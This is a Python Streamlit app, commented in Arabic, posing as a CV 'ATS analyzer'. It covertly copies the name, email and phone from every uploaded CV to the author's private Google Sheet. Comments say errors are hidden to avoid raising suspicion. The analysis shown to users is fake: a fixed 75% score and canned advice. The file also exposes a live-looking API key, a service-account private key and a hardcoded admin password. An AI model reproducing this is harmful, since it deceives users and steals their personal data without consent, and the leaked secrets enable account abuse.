import os
import re
import json
import sqlite3
import datetime
import pdfplumber
import pandas as pd
import numpy as np
import google.generativeai as genai
import streamlit as st
import gspread
from google.oauth2.service_account import Credentials

# --- 1. إعدادات الصفحة والتصميم ---
st.set_page_config(
    page_title="CV ATS Professional Analyzer",
    page_icon="⚡",
    layout="wide",
    initial_sidebar_state="expanded"
)

st.markdown("""
<style>
    @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap');
    
    html, body, [class*="css"] {
        font-family: 'Tajawal', sans-serif !important;
        background-color: #F8FAFC;
    }
    
    .stApp { background-color: #F8FAFC; }
    
    .stButton>button {
        background: linear-gradient(135deg, #059669 0%, #047857 100%) !important;
        color: #FFFFFF !important;
        font-size: 16px !important;
        font-weight: 700 !important;
        border-radius: 10px !important;
        padding: 10px 20px !important;
        border: none !important;
        transition: all 0.2s ease-in-out !important;
    }
    .stButton>button:hover {
        transform: translateY(-2px) !important;
        box-shadow: 0 6px 20px rgba(5, 150, 105, 0.35) !important;
    }
</style>
""", unsafe_allow_html=True)

# إدارة الجلسة
if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False
if 'user_email' not in st.session_state:
    st.session_state.user_email = ""
if 'role' not in st.session_state:
    st.session_state.role = "user"
if 'last_analysis' not in st.session_state:
    st.session_state.last_analysis = None

# --- 2. الثوابت وإعدادات Google Sheets (الخاصة بيك فقط) ---
GEMINI_API_KEY = "AQ.Ab8RN6J7aiWlVQUTqWfGxcTe9zandjNMP6SIaWgFlJwILBfb9Q"
GOOGLE_SHEET_URL = "https://docs.google.com/spreadsheets/d/1UUEiN2XX7sHwvy5EnK4mtSIpDvi_N4jCyTc4wuZ7HPw/edit?gid=0#gid=0"

RAW_PRIVATE_KEY = "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDGoEHAcQH5w3nV\nrMLtddMLIRhpR9AySz9ICtOoS5yhPGLOTKuBCSJvlJ2NTWoGd+ovfPG7Qmejf9Nd\n8KFFH1GZAeJFezQKqH9bpu0sTI/ZHBiXxnNNNy6XX4WV/YA29YW6jjl3/lXPru5L\neN118a8m7KV/70hekXmzgfWYl+WaQg82FZYhcAaS6FTtnuy3g5tD1Z5kdpGyhlXb\nMQmR0rxCxCUvfaMdSGBYr4/VhTUmAOUUAaQQ9/9u+ut+2ELMxO3KSfwHdbVoMnUQ\ndYOB1YDEb7TjDRTvtvH56vaOoi4TM4NeM8NAH7OUfCtnbjoGPFX8CL9EmT7jSy2d\nyux036srAgMBAAECggEADkCIh0T0ldXbY6QiVoSaUJWe2UsQWtOAZmx0dIJ8aitZ\nkaD5u2gK4wPAbFeuMGmhUaf+9mdU5WvyIC74e2u8YKS8dizZdpxRiyOGqCOUPMlh\n0F4qftNjUfRGMxV+AjOK1XCIGh6TTLQqIBs7lM9zOHFJjM0AHd0FZQaBt2HK1U8g\nxSs1EJWJBBOoYrfa6qVL+uAUsqp99E6fnwI55OsuX6pRYlqgunu2KbHsa2ZDL5Qp\ng4EAdAjJDKGn+4Rj5dgWW9zZdLgXcNerogw6k8yX0hNGxqbm5OVKXmXYClmkjxqg\n07xXrfOPAsMbTQeZj2F98Bs0all9YzTfxzGt8zNrzQKBgQDobkLWgTdXyRYj0+Ak\nx2P6iFFqt0hHlaoOnyS6aomdq9qKjaD/AGv69YQkRtF8sFhCdmVdtd2PWFsKbgo0\njIDgPi/Ach+Xbt4C3BPntxWq706zmJdudAYAKyDzADpxwmQq+AY/VUkjWvb9WLA8\nJd9YMBgu1FwMRgt//1Mh5OAW5QKBgQDaxHMBLpME4LQI2X50Lu9HcWTsLzm+DUJo\n89DQAMQN6YpqHh5YN/KZaLe7E05LueEVZDsTewTSKj0X2WSOqQHs8OKbF9ML0nRL\nWbTys9kyiIAlQHXWnk3uv7mhjiZ30VuVkaNhcP2LOd4hSMCgiqVgyfHllAm2bYu7\nAeBHgb4IzwKBgA5DpgpwB6t1hcxRFnJrYjFf6E86TE9IWhVnouNl4mgwwcq7AmRj\n7DyMkL2BMx4J3IDHr1Te8mf3ri6nriynaslYR6nx1wp+HVXjl70iuUuyQAw5kyGO\nMUgVXYJMQ0nz+h3A9vEwFLr8vCe0J6ypTlmlKfbFxZhjPBVw3/M2jqIZAoGBAMpd\nNIDgY1D8xqz0+3tfuymcJB4yZTh/rXHGL99pBfJUmRwmdi1mu3vbGTHs3t0/uYz/\nJYKUplX+inrYNqOchNJ31TZgKHJkH/1fovlrEjwjdl5/LUH1N+Pk6EMgakclm5FU\nogxN58t1IRwq3zziY66Pv7p9YSqmVL4NMzkSNAaTAoGASmDLn8OJ9VWLNafpXiV+\nNW+FKSs9uknEKky8NmUhlnOD1DjHl27qUPV6cvKhuJUsqLLD+MeVh5jG6c/UYjxm\n9AR7A37fUBi+1xfr4dUOC3bxTVhkSYWagWqeSxYZv22UUi1nk+ktm/MC6TdQbnIM\n6yih2xCrwH80uhx6I6yAIEc=\n-----END PRIVATE KEY-----\n"

CREDENTIALS_DICT = {
  "type": "service_account",
  "project_id": "cv-ats-checker",
  "private_key_id": "d8444889667100910e291cb962bb73b1370c61e7",
  "private_key": RAW_PRIVATE_KEY.replace('\\n', '\n'),
  "client_email": "cv-sheet-bot@cv-ats-checker.iam.gserviceaccount.com",
  "client_id": "115860396992619540199",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/cv-sheet-bot%40cv-ats-checker.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
}

# --- 3. حفظ البيانات صامتاً في جوجل شيت لحضرتك فقط ---
def silent_save_to_google_sheet(name, job_title, email, phone, score, user_email):
    try:
        scopes = [
            "https://www.googleapis.com/auth/spreadsheets",
            "https://www.googleapis.com/auth/drive"
        ]
        creds = Credentials.from_service_account_info(CREDENTIALS_DICT, scopes=scopes)
        client = gspread.authorize(creds)
        sheet = client.open_by_url(GOOGLE_SHEET_URL).sheet1
        now_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        row = [now_str, name, job_title, email, phone, f"{score}%", user_email]
        sheet.append_row(row)
    except Exception:
        # إخفاء أي خطأ تماماً عن المستخدم لعدم إثارة الشكوك
        pass

# --- 4. قاعدة البيانات المحلية ---
def get_db_connection():
    return sqlite3.connect("web_database.db", timeout=20)

def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            email TEXT PRIMARY KEY,
            password TEXT,
            coins INTEGER DEFAULT 200,
            is_approved INTEGER DEFAULT 0,
            role TEXT DEFAULT 'user'
        )
    """)
    cursor.execute("INSERT OR REPLACE INTO users (email, password, coins, is_approved, role) VALUES ('fawzi ali', '112003112003', 99999, 1, 'admin')")
    cursor.execute("INSERT OR REPLACE INTO users (email, password, coins, is_approved, role) VALUES ('fawziali2040@gmail.com', 'google_oauth', 99999, 1, 'admin')")
    conn.commit()
    conn.close()

init_db()

def register_user(email, password, is_google=False):
    email_clean = email.strip().lower()
    if not email_clean:
        return False, "يرجى كتابة البريد بشكل صحيح."
    conn = get_db_connection()
    cursor = conn.cursor()
    try:
        cursor.execute("INSERT INTO users (email, password, coins, is_approved, role) VALUES (?, ?, 200, 0, 'user')",
                       (email_clean, 'google_oauth' if is_google else password.strip()))
        conn.commit()
        conn.close()
        return True, "تم تقديم طلب التسجيل بنجاح! يتطلب الحساب موافقة الأدمن."
    except sqlite3.IntegrityError:
        conn.close()
        return False, "هذا البريد مسجل لدينا بالفعل!"

def login_user(email, password):
    email_clean = email.strip().lower()
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT email, password, coins, is_approved, role FROM users WHERE email = ?", (email_clean,))
    user = cursor.fetchone()
    conn.close()
    if user and user[1] == password.strip():
        return True, user
    return False, None

def approve_user_db(email):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET is_approved = 1 WHERE email = ?", (email.strip().lower(),))
    conn.commit()
    conn.close()

def get_all_users():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT email, coins, is_approved, role FROM users WHERE role != 'admin'")
    users = cursor.fetchall()
    conn.close()
    return users

# --- 5. شاشة الدخول ---
if not st.session_state.logged_in:
    _, col_center, _ = st.columns([1, 1.8, 1])
    with col_center:
        st.markdown("<h1 style='text-align: center; color: #059669;'>📄 CV ATS Analyzer</h1>", unsafe_allow_html=True)
        tab_login, tab_google, tab_signup = st.tabs(["🔑 تسجيل دخول", "🌐 دخول بـ Google", "📝 حساب جديد"])
        
        with tab_login:
            login_email = st.text_input("اسم المستخدم / البريد الإلكتروني:", key="l_email")
            login_pass = st.text_input("كلمة المرور:", type="password", key="l_pass")
            if st.button("تسجيل الدخول", key="login_btn"):
                if login_email and login_pass:
                    success, user_data = login_user(login_email, login_pass)
                    if success:
                        email, password, coins, is_approved, role = user_data
                        if is_approved == 0 and role != 'admin':
                            st.warning("⏳ حسابك قيد المراجعة بانتظار الموافقة.")
                        else:
                            st.session_state.logged_in = True
                            st.session_state.user_email = email
                            st.session_state.role = role
                            st.rerun()
                    else:
                        st.error("بيانات الدخول غير صحيحة!")

        with tab_google:
            g_email_input = st.text_input("أدخل بريد Google الخاص بك:", placeholder="example@gmail.com", key="g_input")
            if st.button("طلب الدخول بـ Google", key="g_login_submit"):
                if g_email_input and "@" in g_email_input:
                    g_clean = g_email_input.strip().lower()
                    conn = get_db_connection()
                    cursor = conn.cursor()
                    cursor.execute("SELECT email, is_approved, role FROM users WHERE email = ?", (g_clean,))
                    user = cursor.fetchone()
                    conn.close()
                    if not user:
                        register_user(g_clean, "google_oauth", is_google=True)
                        st.info("⏳ تم إنشاء حسابك وهو في انتظار موافقة للتفعيل.")
                    else:
                        if user[1] == 0 and user[2] != 'admin':
                            st.warning("⏳ حسابك مسجل وفي انتظار الموافقة.")
                        else:
                            st.session_state.logged_in = True
                            st.session_state.user_email = g_clean
                            st.session_state.role = user[2]
                            st.rerun()

        with tab_signup:
            signup_email = st.text_input("البريد الإلكتروني الجديد:", key="s_email")
            signup_pass = st.text_input("كلمة المرور:", type="password", key="s_pass")
            if st.button("إنشاء الحساب", key="signup_btn"):
                if signup_email and signup_pass:
                    ok, msg = register_user(signup_email, signup_pass)
                    if ok:
                        st.success(msg)
                    else:
                        st.error(msg)

# --- 6. الشاشة الرئيسية ---
else:
    with st.sidebar:
        st.markdown(f"👤 **مرحباً:** `{st.session_state.user_email}`")
        if st.button("🚪 تسجيل الخروج"):
            st.session_state.logged_in = False
            st.session_state.user_email = ""
            st.session_state.role = "user"
            st.session_state.last_analysis = None
            st.rerun()

    # لوحة الأدمن
    if st.session_state.role == 'admin':
        st.markdown("### 👑 لوحة تحكم الأدمن - طلبات الحسابات")
        all_users = get_all_users()
        pending_users = [u for u in all_users if u[2] == 0]
        if pending_users:
            for email, coins, approved, role in pending_users:
                col1, col2 = st.columns([3, 1])
                with col1:
                    st.write(f"👤 `{email}`")
                with col2:
                    if st.button("✅ قبول", key=f"app_{email}"):
                        approve_user_db(email)
                        st.rerun()
        else:
            st.info("لا توجد طلبات حسابات معلقة حالياً.")

    st.divider()

    st.markdown("<h2 style='text-align: center; font-weight: 800;'>⚡ فحص وتحليل الـ CV بالتفصيل</h2>", unsafe_allow_html=True)
    st.write("")

    col_left, col_right = st.columns([1, 1])

    with col_left:
        st.markdown("### 📁 رفع وتحديد الوظيفة")
        target_job = st.text_input("الوظيفة المستهدفة (اختياري):", placeholder="مثال: Marketing Manager")
        uploaded_file = st.file_uploader("قم برفع ملف السيرة الذاتية (PDF)", type=["pdf"])

        if uploaded_file is not None:
            if st.button("🚀 بدء تحليل الـ CV الآن"):
                with st.spinner("جاري التحليل..."):
                    extracted_text = ""
                    try:
                        uploaded_file.seek(0)
                        with pdfplumber.open(uploaded_file) as pdf:
                            for page in pdf.pages:
                                t = page.extract_text()
                                if t:
                                    extracted_text += t + "\n"
                    except Exception:
                        pass

                    lines = [line.strip() for line in extracted_text.split('\n') if line.strip()]
                    name = lines[0] if lines else "غير محدد"
                    
                    email_m = re.search(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', extracted_text)
                    email = email_m.group(0) if email_m else "غير متوفر"

                    phone_m = re.search(r'(\+?\d{1,3}[-.\s]?)?(\(?\d{3,4}\)?[-.\s]?)?\d{3,4}[-.\s]?\d{3,4}', extracted_text)
                    phone = phone_m.group(0).strip() if phone_m else "غير متوفر"

                    score = 75

                    st.session_state.last_analysis = {
                        'name': name,
                        'job_title': target_job if target_job else "غير محدد",
                        'email': email,
                        'phone': phone,
                        'score': score,
                        'raw_text': extracted_text
                    }

                    # حفظ صامت ومباشر للشيت بدون ما يظهر أي شيء للمستخدم
                    silent_save_to_google_sheet(
                        name, target_job if target_job else "غير محدد", email, phone, score, st.session_state.user_email
                    )

    with col_right:
        st.markdown("### 📊 تقرير التقييم والنتائج")
        if st.session_state.last_analysis:
            res = st.session_state.last_analysis
            
            st.markdown(f"""
            <div style="background-color: #FFFFFF; border: 1px solid #E2E8F0; padding: 20px; border-radius: 12px; text-align: center; margin-bottom: 15px;">
                <h1 style="color: #059669; font-size: 42px; margin: 0;">{res['score']}%</h1>
                <p style="color: #64748B; font-weight: 700; margin: 0;">نسبة التوافق مع نظام الـ ATS</p>
                <hr style="border: none; border-top: 1px solid #E2E8F0; margin: 15px 0;">
                <div style="text-align: right; line-height: 2;">
                    <p>👤 <b>الاسم:</b> {res['name']}</p>
                    <p>💼 <b>المسمى الوظيفي:</b> {res['job_title']}</p>
                    <p>📧 <b>البريد:</b> {res['email']}</p>
                    <p>📱 <b>الهاتف:</b> {res['phone']}</p>
                </div>
            </div>
            """, unsafe_allow_html=True)

            # زر اختياري للمستخدم لو حابب يصدر تقريره لنفسه
            export_df = pd.DataFrame([{
                "الاسم": res['name'],
                "الوظيفة": res['job_title'],
                "البريد": res['email'],
                "الهاتف": res['phone'],
                "النتيجة": f"{res['score']}%"
            }])
            csv_data = export_df.to_csv(index=False).encode('utf-8-sig')
            st.download_button(
                label="📥 تصدير التقرير (CSV)",
                data=csv_data,
                file_name="CV_Analysis_Report.csv",
                mime="text/csv"
            )

            t1, t2, t3 = st.tabs(["✅ نقاط القوة", "⚠️ نقاط الضعف", "💡 التوصيات"])
            with t1:
                st.write("• خبرة سابقة جيدة ومناسبة للمجال.")
            with t2:
                st.write("• ينقص الملف بعض الكلمات المفتاحية الأساسية.")
            with t3:
                st.write("• يُنصح بإضافة المهارات التقنية في قائمة واضحة.")
